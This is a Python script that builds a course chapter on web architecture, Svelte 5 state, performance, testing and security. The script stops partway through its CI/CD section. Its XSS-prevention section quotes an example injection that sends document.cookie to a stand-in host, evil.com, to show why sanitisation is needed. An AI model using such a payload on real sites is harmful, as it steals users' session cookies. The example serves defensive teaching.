"""Chapter 9: Architecture and System Design"""
import sys, os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from generate_course_pdf import (
    ChapterCoverPage, h1, h2, h3, h4, p, bullet, code_block, analogy_box,
    principal_box, mistake_box, exercise, spacer, checkpoint, page_break,
    ExerciseBox, CalloutBox, CodeBlock, HorizontalLine, COLORS, FRAME_WIDTH
)
from reportlab.platypus import PageBreak, Spacer, Paragraph


def build_chapter_9(styles):
    story = []

    story.append(ChapterCoverPage(9, "Architecture and System Design",
                                  "Becoming the City Architect", "PART 3: PRINCIPAL ENGINEER"))
    story.append(PageBreak())

    # ================================================================
    # 9.1 COMPONENT ARCHITECTURE
    # ================================================================
    story.append(h1("9.1 Component Architecture", styles))
    story.append(analogy_box(
        "Think of component architecture like building with LEGO bricks. An individual 2x4 brick is useless "
        "alone, but when you have a system for how bricks connect — standard sizes, snap-fit interfaces, "
        "instruction manuals — you can build anything from a small house to a full city. Bad architecture is "
        "like gluing LEGO bricks together: it works once, but you can never rebuild, rearrange, or reuse. "
        "Good architecture keeps every piece snappable and rearrangeable."
    , styles))

    story.append(p(
        "As a principal engineer, your job is not just to write components — it is to design <b>systems of "
        "components</b> that scale across teams, products, and years. A junior developer writes a button. A "
        "senior developer writes a reusable button. A principal engineer designs the system that ensures every "
        "button, across every team, follows consistent patterns for accessibility, theming, testing, and "
        "documentation."
    , styles))

    story.append(h2("Atomic Design Methodology", styles))
    story.append(p(
        "Brad Frost's Atomic Design gives us a vocabulary for thinking about UI component hierarchies. "
        "It borrows from chemistry: atoms combine into molecules, molecules into organisms, organisms into "
        "templates, and templates into pages."
    , styles))

    story.append(bullet("<b>Atoms</b> — The smallest UI elements: buttons, inputs, labels, icons, badges. "
                        "They cannot be broken down further without losing meaning.", styles))
    story.append(bullet("<b>Molecules</b> — Groups of atoms functioning together: a search bar (input + button), "
                        "a form field (label + input + error message), a navigation link (icon + text).", styles))
    story.append(bullet("<b>Organisms</b> — Complex UI sections made of molecules and atoms: a header (logo + "
                        "nav links + search bar + user menu), a product card (image + title + price + add-to-cart "
                        "button), a data table with sorting and pagination.", styles))
    story.append(bullet("<b>Templates</b> — Page-level layouts that arrange organisms: a dashboard template "
                        "with sidebar, header, and content area. Templates define where content goes, not what "
                        "the content is.", styles))
    story.append(bullet("<b>Pages</b> — Templates filled with real data: the actual dashboard page showing "
                        "specific stock prices, user data, and live charts.", styles))

    story.append(code_block(
        '// Atomic Design in TradeBoard\n'
        '// src/lib/components/\n'
        '//\n'
        '// atoms/\n'
        '//   Button.svelte          - Base button with variants\n'
        '//   Badge.svelte           - Status badges (up, down, neutral)\n'
        '//   Icon.svelte            - SVG icon wrapper\n'
        '//   Input.svelte           - Text input with validation\n'
        '//   Spinner.svelte         - Loading indicator\n'
        '//\n'
        '// molecules/\n'
        '//   SearchBar.svelte       - Input + Button + suggestions\n'
        '//   StockPrice.svelte      - Price + change badge + sparkline\n'
        '//   FormField.svelte       - Label + Input + error message\n'
        '//   NavLink.svelte         - Icon + text + active indicator\n'
        '//\n'
        '// organisms/\n'
        '//   Header.svelte          - Logo + NavLinks + SearchBar + UserMenu\n'
        '//   StockCard.svelte       - StockPrice + chart + actions\n'
        '//   WatchlistTable.svelte  - Table of StockCards with sorting\n'
        '//   TradeForm.svelte       - FormFields + validation + submit\n'
        '//\n'
        '// templates/\n'
        '//   DashboardLayout.svelte - Sidebar + Header + content slot\n'
        '//   AuthLayout.svelte      - Centered card for login/register\n'
        '//\n'
        '// pages are in src/routes/',
        filename="Component Organization", styles=styles
    ))

    story.append(h2("Component Composition Patterns", styles))
    story.append(p(
        "In Svelte 5, there are several patterns for composing components together. Each has its place, "
        "and a principal engineer knows when to use which."
    , styles))

    story.append(h3("Slot-Based Composition", styles))
    story.append(code_block(
        '<!-- Card.svelte - A composable card component -->\n'
        '<script>\n'
        '  let { children, header, footer } = $props();\n'
        '</script>\n\n'
        '<div class="card">\n'
        '  {#if header}\n'
        '    <div class="card-header">\n'
        '      {@render header()}\n'
        '    </div>\n'
        '  {/if}\n\n'
        '  <div class="card-body">\n'
        '    {@render children()}\n'
        '  </div>\n\n'
        '  {#if footer}\n'
        '    <div class="card-footer">\n'
        '      {@render footer()}\n'
        '    </div>\n'
        '  {/if}\n'
        '</div>\n\n'
        '<!-- Usage -->\n'
        '<Card>\n'
        '  {#snippet header()}\n'
        '    <h2>AAPL Stock</h2>\n'
        '  {/snippet}\n\n'
        '  <p>Current Price: $187.44</p>\n\n'
        '  {#snippet footer()}\n'
        '    <Button onclick={buy}>Buy</Button>\n'
        '  {/snippet}\n'
        '</Card>',
        filename="Slot Composition in Svelte 5", styles=styles
    ))

    story.append(h3("Render Props Pattern", styles))
    story.append(code_block(
        '<!-- DataFetcher.svelte - Render props for data loading -->\n'
        '<script>\n'
        '  let { url, children, loading, error: errorSnippet } = $props();\n'
        '  let data = $state(null);\n'
        '  let err = $state(null);\n'
        '  let isLoading = $state(true);\n\n'
        '  $effect(() => {\n'
        '    isLoading = true;\n'
        '    fetch(url)\n'
        '      .then(r => r.json())\n'
        '      .then(d => { data = d; isLoading = false; })\n'
        '      .catch(e => { err = e; isLoading = false; });\n'
        '  });\n'
        '</script>\n\n'
        '{#if isLoading}\n'
        '  {@render loading()}\n'
        '{:else if err}\n'
        '  {@render errorSnippet(err)}\n'
        '{:else}\n'
        '  {@render children(data)}\n'
        '{/if}\n\n'
        '<!-- Usage -->\n'
        '<DataFetcher url="/api/stocks/AAPL">\n'
        '  {#snippet children(stock)}\n'
        '    <StockCard {stock} />\n'
        '  {/snippet}\n'
        '  {#snippet loading()}\n'
        '    <Spinner />\n'
        '  {/snippet}\n'
        '  {#snippet error(e)}\n'
        '    <ErrorBanner message={e.message} />\n'
        '  {/snippet}\n'
        '</DataFetcher>',
        filename="Render Props Pattern", styles=styles
    ))

    story.append(h3("Data Flow: Props Down, Events Up", styles))
    story.append(p(
        "The fundamental rule of component architecture: data flows <b>down</b> through props, and "
        "notifications flow <b>up</b> through events (callbacks). When you violate this rule — when a child "
        "component reaches up to modify parent state directly — you create invisible dependencies that make "
        "your code impossible to reason about."
    , styles))

    story.append(code_block(
        '// Props down, events up\n'
        '// Parent.svelte\n'
        '<script>\n'
        '  let stocks = $state([]);\n'
        '  function handleRemove(ticker) {\n'
        '    stocks = stocks.filter(s => s.ticker !== ticker);\n'
        '  }\n'
        '</script>\n\n'
        '{#each stocks as stock}\n'
        '  <StockCard\n'
        '    {stock}\n'
        '    onremove={() => handleRemove(stock.ticker)}\n'
        '  />\n'
        '{/each}\n\n'
        '// StockCard.svelte\n'
        '<script>\n'
        '  let { stock, onremove } = $props();\n'
        '</script>\n'
        '<button onclick={onremove}>Remove {stock.ticker}</button>',
        filename="Props Down, Events Up", styles=styles
    ))

    story.append(principal_box(
        "Context API should be used sparingly — only for truly cross-cutting concerns like theme, "
        "locale, auth state, and feature flags. If you find yourself passing data through context because "
        "prop drilling is 'annoying,' you probably need to restructure your component hierarchy. Prop "
        "drilling through 2-3 levels is normal and healthy — it makes data flow explicit and traceable."
    , styles))

    story.append(spacer(8))
    story.append(checkpoint("You understand Atomic Design, component composition patterns, and data flow "
                           "principles for scalable component architectures.", styles))
    story.append(page_break())

    # ================================================================
    # 9.2 STATE MANAGEMENT AT SCALE
    # ================================================================
    story.append(h1("9.2 State Management at Scale", styles))
    story.append(analogy_box(
        "Think of state management like a city's water system. Local state is a personal water bottle "
        "— only you use it. Shared state is a water fountain in a park — multiple people access it. Server "
        "state is the reservoir and water treatment plant — the source of truth that everyone depends on. "
        "You need all three, and the architecture of your pipes (data flow) determines whether everyone "
        "gets clean water or your system collapses under pressure."
    , styles))

    story.append(h2("The Three Types of State", styles))
    story.append(p(
        "A principal engineer categorizes state before deciding how to manage it. Every piece of state "
        "in your application falls into one of three categories, and each category demands a different strategy."
    , styles))

    story.append(bullet("<b>Local/UI State</b> — State that belongs to a single component: form inputs, "
                        "toggle states, dropdown open/closed, animation progress, scroll position. Managed "
                        "with <code>$state()</code> inside the component.", styles))
    story.append(bullet("<b>Shared/Client State</b> — State that multiple components need: current user, "
                        "theme preference, shopping cart, selected filters. Managed with Svelte stores or "
                        "context.", styles))
    story.append(bullet("<b>Server/Remote State</b> — Data that lives on the server and is cached locally: "
                        "stock prices, user profiles, order history. Managed with SvelteKit load functions "
                        "and potentially a cache layer.", styles))

    story.append(mistake_box(
        "The biggest state management mistake is treating all state the same. Putting a form input's "
        "current value into a global store is like running a pipe from the city reservoir to brush your "
        "teeth — absurdly over-engineered. Conversely, managing authentication state with a local $state() "
        "variable means every component that needs the current user must duplicate the logic."
    , styles))

    story.append(h2("Svelte 5 Runes for State Management", styles))
    story.append(code_block(
        '// src/lib/stores/watchlist.svelte.ts\n'
        '// A reactive store using Svelte 5 runes\n\n'
        'interface Stock {\n'
        '  ticker: string;\n'
        '  name: string;\n'
        '  price: number;\n'
        '  change: number;\n'
        '}\n\n'
        'function createWatchlistStore() {\n'
        '  let stocks = $state<Stock[]>([]);\n'
        '  let isLoading = $state(false);\n'
        '  let error = $state<string | null>(null);\n\n'
        '  // Derived state\n'
        '  let totalValue = $derived(\n'
        '    stocks.reduce((sum, s) => sum + s.price, 0)\n'
        '  );\n'
        '  let gainers = $derived(\n'
        '    stocks.filter(s => s.change > 0)\n'
        '  );\n'
        '  let losers = $derived(\n'
        '    stocks.filter(s => s.change < 0)\n'
        '  );\n\n'
        '  async function load() {\n'
        '    isLoading = true;\n'
        '    error = null;\n'
        '    try {\n'
        '      const res = await fetch("/api/watchlist");\n'
        '      stocks = await res.json();\n'
        '    } catch (e) {\n'
        '      error = e instanceof Error ? e.message : "Failed";\n'
        '    } finally {\n'
        '      isLoading = false;\n'
        '    }\n'
        '  }\n\n'
        '  function add(stock: Stock) {\n'
        '    stocks = [...stocks, stock];\n'
        '  }\n\n'
        '  function remove(ticker: string) {\n'
        '    stocks = stocks.filter(s => s.ticker !== ticker);\n'
        '  }\n\n'
        '  return {\n'
        '    get stocks() { return stocks; },\n'
        '    get isLoading() { return isLoading; },\n'
        '    get error() { return error; },\n'
        '    get totalValue() { return totalValue; },\n'
        '    get gainers() { return gainers; },\n'
        '    get losers() { return losers; },\n'
        '    load,\n'
        '    add,\n'
        '    remove\n'
        '  };\n'
        '}\n\n'
        'export const watchlist = createWatchlistStore();',
        filename="Reactive Store with Runes", styles=styles
    ))

    story.append(h2("State Machines for Complex UI", styles))
    story.append(p(
        "When UI state has multiple modes with specific transitions between them, a state machine "
        "prevents impossible states. A trade form, for example, can be idle, validating, submitting, "
        "succeeded, or failed. A state machine guarantees you never go from 'idle' directly to 'succeeded' "
        "without passing through 'submitting'."
    , styles))

    story.append(code_block(
        '// State machine for a trade form\n'
        'type TradeState =\n'
        '  | { status: "idle" }\n'
        '  | { status: "validating"; data: TradeInput }\n'
        '  | { status: "confirming"; data: ValidatedTrade }\n'
        '  | { status: "submitting"; data: ValidatedTrade }\n'
        '  | { status: "success"; result: TradeResult }\n'
        '  | { status: "error"; error: string; data: TradeInput };\n\n'
        'type TradeEvent =\n'
        '  | { type: "SUBMIT"; data: TradeInput }\n'
        '  | { type: "VALIDATE_SUCCESS"; data: ValidatedTrade }\n'
        '  | { type: "VALIDATE_ERROR"; error: string }\n'
        '  | { type: "CONFIRM" }\n'
        '  | { type: "CANCEL" }\n'
        '  | { type: "SUCCESS"; result: TradeResult }\n'
        '  | { type: "ERROR"; error: string };\n\n'
        'function tradeReducer(state: TradeState, event: TradeEvent): TradeState {\n'
        '  switch (state.status) {\n'
        '    case "idle":\n'
        '      if (event.type === "SUBMIT")\n'
        '        return { status: "validating", data: event.data };\n'
        '      return state;\n'
        '    case "validating":\n'
        '      if (event.type === "VALIDATE_SUCCESS")\n'
        '        return { status: "confirming", data: event.data };\n'
        '      if (event.type === "VALIDATE_ERROR")\n'
        '        return { status: "error", error: event.error, data: state.data };\n'
        '      return state;\n'
        '    case "confirming":\n'
        '      if (event.type === "CONFIRM")\n'
        '        return { status: "submitting", data: state.data };\n'
        '      if (event.type === "CANCEL")\n'
        '        return { status: "idle" };\n'
        '      return state;\n'
        '    case "submitting":\n'
        '      if (event.type === "SUCCESS")\n'
        '        return { status: "success", result: event.result };\n'
        '      if (event.type === "ERROR")\n'
        '        return { status: "error", error: event.error, data: state.data };\n'
        '      return state;\n'
        '    default:\n'
        '      return state;\n'
        '  }\n'
        '}',
        filename="State Machine Pattern", styles=styles
    ))

    story.append(h2("Optimistic Updates", styles))
    story.append(p(
        "Optimistic updates make your UI feel instant by updating the state before the server confirms. "
        "If the server rejects the change, you roll back. This pattern is critical for perceived performance."
    , styles))

    story.append(code_block(
        '// Optimistic update pattern\n'
        'async function toggleFavorite(ticker: string) {\n'
        '  // Save previous state for rollback\n'
        '  const previousStocks = [...stocks];\n\n'
        '  // Optimistically update UI immediately\n'
        '  stocks = stocks.map(s =>\n'
        '    s.ticker === ticker\n'
        '      ? { ...s, isFavorite: !s.isFavorite }\n'
        '      : s\n'
        '  );\n\n'
        '  try {\n'
        '    // Send to server\n'
        '    const res = await fetch(`/api/favorites/${ticker}`, {\n'
        '      method: "POST"\n'
        '    });\n'
        '    if (!res.ok) throw new Error("Failed");\n'
        '  } catch {\n'
        '    // Rollback on failure\n'
        '    stocks = previousStocks;\n'
        '    showToast("Could not update favorite. Please try again.");\n'
        '  }\n'
        '}',
        filename="Optimistic Updates", styles=styles
    ))

    story.append(spacer(8))
    story.append(checkpoint("You can categorize state, build reactive stores with Svelte 5 runes, "
                           "implement state machines, and use optimistic updates.", styles))
    story.append(page_break())

    # ================================================================
    # 9.3 PERFORMANCE ENGINEERING
    # ================================================================
    story.append(h1("9.3 Performance Engineering", styles))
    story.append(analogy_box(
        "Performance engineering is like traffic planning for a city. You can have the most beautiful "
        "buildings in the world, but if it takes 45 minutes to drive two blocks, nobody will visit. Core "
        "Web Vitals are the traffic reports: LCP measures how fast the main road opens, FID measures how "
        "quickly intersections respond to drivers, and CLS measures how often the road unexpectedly shifts "
        "lanes. A principal engineer designs for smooth traffic flow, not just pretty buildings."
    , styles))

    story.append(h2("Core Web Vitals", styles))
    story.append(p(
        "Google uses Core Web Vitals as ranking signals. They measure real user experience, not just "
        "server speed. Understanding these metrics is non-negotiable for a principal engineer."
    , styles))

    story.append(bullet("<b>LCP (Largest Contentful Paint)</b> — How fast the main content appears. "
                        "Target: under 2.5 seconds. The 'largest' element is usually a hero image, heading, "
                        "or video. Optimize with preloading, responsive images, and fast server responses.", styles))
    story.append(bullet("<b>FID/INP (First Input Delay / Interaction to Next Paint)</b> — How fast the page "
                        "responds to user interaction. Target: under 200ms. Caused by long JavaScript tasks "
                        "blocking the main thread. Fix with code splitting, web workers, and debouncing.", styles))
    story.append(bullet("<b>CLS (Cumulative Layout Shift)</b> — How much the page jumps around during loading. "
                        "Target: under 0.1. Caused by images without dimensions, dynamically injected content, "
                        "and web fonts loading late. Fix with explicit sizes and font-display: swap.", styles))

    story.append(h2("Bundle Size Optimization", styles))
    story.append(code_block(
        '// 1. Dynamic imports for code splitting\n'
        '// Instead of importing everything at the top:\n'
        '// import { heavyChart } from "./charts";  // BAD: loads on every page\n\n'
        '// Load only when needed:\n'
        'const ChartModule = await import("./charts");\n\n'
        '// In SvelteKit, use dynamic imports in load functions:\n'
        'export async function load() {\n'
        '  const { processData } = await import("$lib/heavy-utils");\n'
        '  return { processed: processData(rawData) };\n'
        '}\n\n'
        '// 2. Tree shaking - import only what you need\n'
        '// BAD: imports entire library\n'
        '// import _ from "lodash";\n'
        '// _.debounce(fn, 300);\n\n'
        '// GOOD: imports only the function\n'
        'import debounce from "lodash/debounce";\n'
        'debounce(fn, 300);\n\n'
        '// 3. Analyze your bundle\n'
        '// In vite.config.ts:\n'
        'import { visualizer } from "rollup-plugin-visualizer";\n'
        'export default defineConfig({\n'
        '  plugins: [\n'
        '    sveltekit(),\n'
        '    visualizer({ open: true, gzipSize: true })\n'
        '  ]\n'
        '});',
        filename="Bundle Optimization Techniques", styles=styles
    ))

    story.append(h2("Image Optimization", styles))
    story.append(code_block(
        '<!-- Modern image optimization -->\n'
        '<picture>\n'
        '  <!-- AVIF: best compression, modern browsers -->\n'
        '  <source srcset="hero.avif" type="image/avif" />\n'
        '  <!-- WebP: good compression, wide support -->\n'
        '  <source srcset="hero.webp" type="image/webp" />\n'
        '  <!-- JPEG: fallback for old browsers -->\n'
        '  <img\n'
        '    src="hero.jpg"\n'
        '    alt="Dashboard hero image"\n'
        '    width="1200"\n'
        '    height="600"\n'
        '    loading="lazy"\n'
        '    decoding="async"\n'
        '  />\n'
        '</picture>\n\n'
        '<!-- Responsive images with srcset -->\n'
        '<img\n'
        '  srcset="hero-400.jpg 400w, hero-800.jpg 800w, hero-1200.jpg 1200w"\n'
        '  sizes="(max-width: 600px) 400px, (max-width: 1000px) 800px, 1200px"\n'
        '  src="hero-800.jpg"\n'
        '  alt="Dashboard"\n'
        '  width="1200"\n'
        '  height="600"\n'
        '/>',
        filename="Image Optimization", styles=styles
    ))

    story.append(h2("Caching Strategies", styles))
    story.append(p(
        "Caching is the most powerful performance tool. A cache hit is infinitely faster than any "
        "optimization to the original request. The question is never whether to cache, but what strategy "
        "to use."
    , styles))

    story.append(bullet("<b>Cache-Control headers</b> — Tell browsers how long to cache: "
                        "<code>Cache-Control: public, max-age=31536000, immutable</code> for hashed assets; "
                        "<code>Cache-Control: no-cache</code> for HTML (always revalidate).", styles))
    story.append(bullet("<b>Service Workers</b> — Intercept network requests for offline support and "
                        "instant loading. Cache API responses, static assets, and even full pages.", styles))
    story.append(bullet("<b>SWR (Stale While Revalidate)</b> — Show cached data immediately, then fetch "
                        "fresh data in the background and update the UI. Best for data that changes but "
                        "doesn't need to be real-time.", styles))

    story.append(principal_box(
        "The golden rule of caching: cache aggressively, invalidate precisely. Use content-hashed "
        "filenames for static assets (Vite does this automatically) so they can be cached forever. Use "
        "ETag or Last-Modified for API responses so the server only sends data when it has changed. "
        "Never cache authentication tokens or user-specific data in shared caches."
    , styles))

    story.append(spacer(8))
    story.append(checkpoint("You understand Core Web Vitals, bundle optimization, image strategies, and "
                           "caching patterns for high-performance web applications.", styles))
    story.append(page_break())

    # ================================================================
    # 9.4 TESTING STRATEGIES
    # ================================================================
    story.append(h1("9.4 Testing Strategies", styles))
    story.append(analogy_box(
        "Testing is like the building inspection process for a city. Unit tests are inspecting individual "
        "bricks — is each one the right size and strength? Integration tests are checking that walls stand "
        "up — do the bricks hold together properly? End-to-end tests are having a family move in and live "
        "in the house for a week — does everything actually work in real life? You need all three levels, "
        "but in different proportions: many brick inspections, fewer wall checks, and a handful of "
        "full house trials."
    , styles))

    story.append(h2("The Testing Pyramid", styles))
    story.append(p(
        "The testing pyramid tells you how many tests to write at each level. The base is wide (many fast "
        "unit tests), the middle is narrower (fewer integration tests), and the top is a point (a few "
        "slow end-to-end tests)."
    , styles))

    story.append(bullet("<b>Unit Tests (70%)</b> — Test individual functions and components in isolation. "
                        "Fast (milliseconds), reliable, easy to debug. Use Vitest.", styles))
    story.append(bullet("<b>Integration Tests (20%)</b> — Test components working together: a form that "
                        "validates, submits, and shows results. Medium speed, test real interactions. "
                        "Use Testing Library + Vitest.", styles))
    story.append(bullet("<b>E2E Tests (10%)</b> — Test complete user flows in a real browser: sign up, "
                        "add stocks to watchlist, place a trade. Slow but catch real bugs. Use Playwright.", styles))

    story.append(h2("Unit Testing with Vitest", styles))
    story.append(code_block(
        '// src/lib/utils/format.test.ts\n'
        'import { describe, it, expect } from "vitest";\n'
        'import { formatCurrency, formatPercent, formatDate } from "./format";\n\n'
        'describe("formatCurrency", () => {\n'
        '  it("formats positive numbers with dollar sign", () => {\n'
        '    expect(formatCurrency(1234.56)).toBe("$1,234.56");\n'
        '  });\n\n'
        '  it("formats negative numbers with parentheses", () => {\n'
        '    expect(formatCurrency(-500)).toBe("($500.00)");\n'
        '  });\n\n'
        '  it("handles zero", () => {\n'
        '    expect(formatCurrency(0)).toBe("$0.00");\n'
        '  });\n\n'
        '  it("handles very large numbers", () => {\n'
        '    expect(formatCurrency(1_000_000)).toBe("$1,000,000.00");\n'
        '  });\n'
        '});\n\n'
        'describe("formatPercent", () => {\n'
        '  it("formats with + sign for positive", () => {\n'
        '    expect(formatPercent(5.25)).toBe("+5.25%");\n'
        '  });\n\n'
        '  it("includes - sign for negative", () => {\n'
        '    expect(formatPercent(-3.1)).toBe("-3.10%");\n'
        '  });\n'
        '});',
        filename="Unit Tests with Vitest", styles=styles
    ))

    story.append(h2("Component Testing", styles))
    story.append(code_block(
        '// src/lib/components/StockCard.test.ts\n'
        'import { render, screen, fireEvent } from "@testing-library/svelte";\n'
        'import { describe, it, expect, vi } from "vitest";\n'
        'import StockCard from "./StockCard.svelte";\n\n'
        'describe("StockCard", () => {\n'
        '  const mockStock = {\n'
        '    ticker: "AAPL",\n'
        '    name: "Apple Inc.",\n'
        '    price: 187.44,\n'
        '    change: 2.35,\n'
        '    changePercent: 1.27\n'
        '  };\n\n'
        '  it("renders stock ticker and name", () => {\n'
        '    render(StockCard, { props: { stock: mockStock } });\n'
        '    expect(screen.getByText("AAPL")).toBeInTheDocument();\n'
        '    expect(screen.getByText("Apple Inc.")).toBeInTheDocument();\n'
        '  });\n\n'
        '  it("shows green styling for positive change", () => {\n'
        '    render(StockCard, { props: { stock: mockStock } });\n'
        '    const changeEl = screen.getByText("+1.27%");\n'
        '    expect(changeEl).toHaveClass("positive");\n'
        '  });\n\n'
        '  it("calls onremove when remove button clicked", async () => {\n'
        '    const onremove = vi.fn();\n'
        '    render(StockCard, {\n'
        '      props: { stock: mockStock, onremove }\n'
        '    });\n'
        '    await fireEvent.click(screen.getByRole("button", { name: /remove/i }));\n'
        '    expect(onremove).toHaveBeenCalledOnce();\n'
        '  });\n'
        '});',
        filename="Component Testing", styles=styles
    ))

    story.append(h2("E2E Testing with Playwright", styles))
    story.append(code_block(
        '// tests/watchlist.spec.ts\n'
        'import { test, expect } from "@playwright/test";\n\n'
        'test.describe("Watchlist", () => {\n'
        '  test.beforeEach(async ({ page }) => {\n'
        '    // Log in before each test\n'
        '    await page.goto("/login");\n'
        '    await page.fill(\'[name="email"]\', "test@example.com");\n'
        '    await page.fill(\'[name="password"]\', "password123");\n'
        '    await page.click(\'button[type="submit"]\');\n'
        '    await page.waitForURL("/dashboard");\n'
        '  });\n\n'
        '  test("can add a stock to watchlist", async ({ page }) => {\n'
        '    // Search for a stock\n'
        '    await page.fill(\'[data-testid="search-input"]\', "AAPL");\n'
        '    await page.click(\'[data-testid="search-result-AAPL"]\');\n\n'
        '    // Add to watchlist\n'
        '    await page.click(\'button:has-text("Add to Watchlist")\');\n\n'
        '    // Verify it appears\n'
        '    await expect(\n'
        '      page.locator(\'[data-testid="watchlist-item-AAPL"]\')\n'
        '    ).toBeVisible();\n'
        '  });\n\n'
        '  test("can remove a stock from watchlist", async ({ page }) => {\n'
        '    await page.goto("/dashboard/watchlist");\n'
        '    await page.click(\n'
        '      \'[data-testid="watchlist-item-AAPL"] button:has-text("Remove")\'\n'
        '    );\n'
        '    await expect(\n'
        '      page.locator(\'[data-testid="watchlist-item-AAPL"]\')\n'
        '    ).not.toBeVisible();\n'
        '  });\n'
        '});',
        filename="E2E Tests with Playwright", styles=styles
    ))

    story.append(principal_box(
        "Write tests that describe behavior, not implementation. 'it formats currency with dollar sign' "
        "is a behavior test — it survives refactoring. 'it calls toLocaleString with en-US' is an "
        "implementation test — it breaks when you change how you format, even if the output is correct. "
        "The best tests let you refactor freely while catching real bugs."
    , styles))

    story.append(spacer(8))
    story.append(checkpoint("You can implement unit tests with Vitest, component tests with Testing Library, "
                           "and E2E tests with Playwright.", styles))
    story.append(page_break())

    # ================================================================
    # 9.5 SECURITY BEST PRACTICES
    # ================================================================
    story.append(h1("9.5 Security Best Practices", styles))
    story.append(analogy_box(
        "Security is like a city's defense system. The firewall is the city wall — it keeps unauthorized "
        "traffic out. Authentication is the gate — it verifies identity before letting anyone in. "
        "Authorization is the key system — different people get access to different buildings. Input "
        "validation is the customs checkpoint — everything coming in gets inspected. A principal engineer "
        "designs all four layers, knowing that a chain is only as strong as its weakest link."
    , styles))

    story.append(h2("XSS (Cross-Site Scripting) Prevention", styles))
    story.append(p(
        "XSS is the most common web vulnerability. An attacker injects malicious JavaScript into your "
        "page, which then runs in other users' browsers with full access to their cookies, session, "
        "and DOM."
    , styles))

    story.append(code_block(
        '// XSS Attack Example\n'
        '// If user input is rendered without sanitization:\n'
        '// User enters: <script>fetch("https://evil.com/steal?cookie="+document.cookie)</script>\n\n'
        '// VULNERABLE (never do this):\n'
        'element.innerHTML = userInput;  // BAD!\n'
        '// This is also unsafe in Svelte:\n'
        '// {@html userInput}  // BAD without sanitization!\n\n'
        '// SAFE approaches:\n'
        '// 1. Svelte auto-escapes by default\n'
        '//    {userInput}  is safe - Svelte escapes HTML entities\n\n'
        '// 2. If you must render HTML, sanitize first\n'
        'import DOMPurify from "dompurify";\n'
        'const clean = DOMPurify.sanitize(userInput);\n'
        '// {@html clean}  is safe after DOMPurify\n\n'
        '// 3. Content Security Policy header\n'
        '// In hooks.server.ts:\n'
        'export async function handle({ event, resolve }) {\n'
        '  const response = await resolve(event);\n'
        '  response.headers.set(\n'
        '    "Content-Security-Policy",\n'
        '    "default-src \'self\'; script-src \'self\'; style-src \'self\' \'unsafe-inline\'"\n'
        '  );\n'
        '  return response;\n'
        '}',
        filename="XSS Prevention", styles=styles
    ))

    story.append(h2("CSRF Protection", styles))
    story.append(p(
        "CSRF (Cross-Site Request Forgery) tricks a logged-in user's browser into making unwanted "
        "requests. SvelteKit's form actions include CSRF protection by default — they check the Origin "
        "header. For API routes, you should implement additional protections."
    , styles))

    story.append(code_block(
        '// CSRF protection in SvelteKit API routes\n'
        '// hooks.server.ts\n'
        'export async function handle({ event, resolve }) {\n'
        '  // Verify Origin header for state-changing requests\n'
        '  if (event.request.method !== "GET") {\n'
        '    const origin = event.request.headers.get("Origin");\n'
        '    const host = event.request.headers.get("Host");\n'
        '    if (!origin || new URL(origin).host !== host) {\n'
        '      return new Response("Forbidden", { status: 403 });\n'
        '    }\n'
        '  }\n'
        '  return resolve(event);\n'
        '}',
        filename="CSRF Protection", styles=styles
    ))

    story.append(h2("Authentication Patterns", styles))
    story.append(code_block(
        '// Session-based auth in SvelteKit\n'
        '// hooks.server.ts\n'
        'import { verifySession } from "$lib/server/auth";\n\n'
        'export async function handle({ event, resolve }) {\n'
        '  const sessionId = event.cookies.get("session_id");\n\n'
        '  if (sessionId) {\n'
        '    const user = await verifySession(sessionId);\n'
        '    if (user) {\n'
        '      event.locals.user = user;\n'
        '    } else {\n'
        '      // Invalid session - clear the cookie\n'
        '      event.cookies.delete("session_id", { path: "/" });\n'
        '    }\n'
        '  }\n\n'
        '  return resolve(event);\n'
        '}\n\n'
        '// Protecting routes in +page.server.ts\n'
        'import { redirect } from "@sveltejs/kit";\n\n'
        'export async function load({ locals }) {\n'
        '  if (!locals.user) {\n'
        '    throw redirect(302, "/login");\n'
        '  }\n'
        '  return { user: locals.user };\n'
        '}\n\n'
        '// Password hashing (NEVER store plain text)\n'
        'import bcrypt from "bcrypt";\n'
        'const SALT_ROUNDS = 12;\n\n'
        'async function hashPassword(password: string): Promise<string> {\n'
        '  return bcrypt.hash(password, SALT_ROUNDS);\n'
        '}\n\n'
        'async function verifyPassword(\n'
        '  password: string,\n'
        '  hash: string\n'
        '): Promise<boolean> {\n'
        '  return bcrypt.compare(password, hash);\n'
        '}',
        filename="Authentication Implementation", styles=styles
    ))

    story.append(h2("Input Validation", styles))
    story.append(code_block(
        '// ALWAYS validate on the server (client validation is UX, not security)\n'
        '// src/routes/api/trade/+server.ts\n'
        'import { z } from "zod";\n\n'
        'const TradeSchema = z.object({\n'
        '  ticker: z.string().min(1).max(5).regex(/^[A-Z]+$/),\n'
        '  action: z.enum(["buy", "sell"]),\n'
        '  quantity: z.number().int().positive().max(100_000),\n'
        '  price: z.number().positive().multipleOf(0.01),\n'
        '});\n\n'
        'export async function POST({ request, locals }) {\n'
        '  if (!locals.user) {\n'
        '    return new Response("Unauthorized", { status: 401 });\n'
        '  }\n\n'
        '  const body = await request.json();\n'
        '  const result = TradeSchema.safeParse(body);\n\n'
        '  if (!result.success) {\n'
        '    return Response.json(\n'
        '      { errors: result.error.flatten().fieldErrors },\n'
        '      { status: 400 }\n'
        '    );\n'
        '  }\n\n'
        '  // result.data is now typed and validated\n'
        '  const trade = await executeTrade(locals.user.id, result.data);\n'
        '  return Response.json(trade);\n'
        '}',
        filename="Server-Side Validation with Zod", styles=styles
    ))

    story.append(mistake_box(
        "Client-side validation is for user experience, not security. An attacker can bypass any "
        "client-side check by using curl, Postman, or the browser's DevTools. Every input must be "
        "validated on the server, regardless of what the client validates. Think of client validation "
        "as a courtesy to honest users and server validation as a defense against attackers."
    , styles))

    story.append(spacer(8))
    story.append(checkpoint("You understand XSS prevention, CSRF protection, authentication patterns, "
                           "and server-side validation.", styles))
    story.append(page_break())

    # ================================================================
    # 9.6 DEVOPS AND CI/CD
    # ================================================================
    story.append(h1("9.6 DevOps and CI/CD", styles))
    story.append(analogy_box(
        "DevOps is like a city's infrastructure maintenance system. Without it, roads crack, pipes leak, "
        "and electricity fails randomly. With good DevOps, there is a system that automatically detects "
        "problems (monitoring), fixes common issues (automation), and deploys updates safely (CI/CD). "
        "A principal engineer does not just build the buildings — they build the systems that maintain the "
        "buildings."
    , styles))

    story.append(h2("Git Workflow: Trunk-Based Development", styles))
    story.append(p(
        "At principal engineer scale, the team's git workflow can make or break velocity. Trunk-based "
        "development is the gold standard for high-performing teams. Everyone works on short-lived feature "
